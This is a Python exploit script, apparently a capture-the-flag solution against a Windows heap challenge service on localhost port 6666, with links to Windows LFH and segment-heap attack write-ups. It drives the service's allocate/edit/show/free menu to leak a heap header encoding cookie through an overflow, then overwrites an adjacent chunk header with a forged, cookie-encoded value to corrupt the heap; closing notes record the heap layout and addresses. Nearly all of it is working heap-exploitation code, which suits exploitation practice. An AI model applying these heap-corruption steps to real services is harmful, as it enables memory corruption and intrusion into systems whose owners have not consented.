'''
https://github.com/scwuaptx/LazyFragmentationHeap/blob/master/exp.py
https://labs.bluefrostsecurity.de/blog.html/2022/08/16/windows-segment-heap-attacking-the-vs-allocator/#lsb-technique-overflowing-the-least-significant-byte
https://illmatics.com/Understanding_the_LFH.pdf
https://blog.lamarranet.com/wp-content/uploads/2021/09/WinDbg-Cheat-Sheet.pdf
'''

import socket
import struct
from time import sleep


class Connection:

    def __init__(self):
        self.sock = socket.socket()
        self.sock.connect(("127.0.0.1", 6666))

    def send(self, data: bytes):
        self.sock.send(data)

    def tobytes(self, data: str):
        return bytes(data, "utf-8")

    def recv_until(self, end: str):
        _end = self.tobytes(end)
        buf = b""
        while _end not in buf:
            buf += self.sock.recv(1)
        return buf

    def next(self):
        self.recv_until(":")

    def alloc(self, size: int, id: int):
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def edit(self, id: int, data: bytes):
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(data)

    def show(self, id: int):
        self.next()
        self.send(b"3\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        # buf = self.recv_until("A" * 0x228)
        # return buf

    def free(self, id: int):
        self.next()
        self.send(b"4\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def openFile(self):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(b"3\n")

    def readFile(self, size: int, id: int):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(b"3\n")


def main():
    conn = Connection()
    for i in range(6):
        conn.openFile()
    conn.alloc(0x228, 1)
    conn.alloc(0x228, 2)
    conn.alloc(0x228, 3)
    conn.edit(1, b"A" * 0x228)
    conn.show(1)
    conn.recv_until("A" * 0x228)
    sleep(.1)
    cookie = conn.sock.recv(8)
    print(cookie)
    print(hex(int.from_bytes(
        cookie[:-2].ljust(8, b"\x00"), "little")))
    cookie = int.from_bytes(
        cookie[:-2].ljust(8, b"\x00"), "little") ^ 0x2322010023 & 0xffffffffffff
    print(hex(cookie))
    input("fuck")
    conn.alloc(0x268, 4)
    conn.alloc(0x5a0, 5)
    conn.alloc(0x1000, 6)
    conn.alloc(0x280, 7)
    conn.alloc(0x280, 0x12345678)  # cookie ^ 0x37010137)
    conn.openFile()
    conn.readFile(0x268, 4)
    # input("enter")
    conn.edit(4, b"A" * 0x268 + struct.pack("<Q", cookie ^ 0x27ae0101ae))
    # conn.edit(4, b"A" * 0x268 + struct.pack("<Q", cookie))
    # input("enter")
    conn.free(5)
    # input("enter")
    conn.alloc(0x5a0, 5)
    conn.show(6)
    sleep(.1)
    conn.next()
    print(conn.sock.recv(0x8))
    input("end")
    conn.send(b"6\n")


if __name__ == "__main__":
    main()


'''
if ID == 0; ID = 0xddaa

struct heap
{
0x0     0x00000beefdad0000
0x8     0
0x10    0
0x18    0x04
}

0x00000beefdad0000
0x0     0x0000ddaabeef1acd (after alloc)
0x8     slot one size (after alloc)
0x10    slot one ID (after alloc)
0x18    0x0000ddaabeef1acd (after alloc)
0x20    slot one heap alloc addr

0000015d`f7925840
0000015d`f7927960
0000015d`f7927960
'''
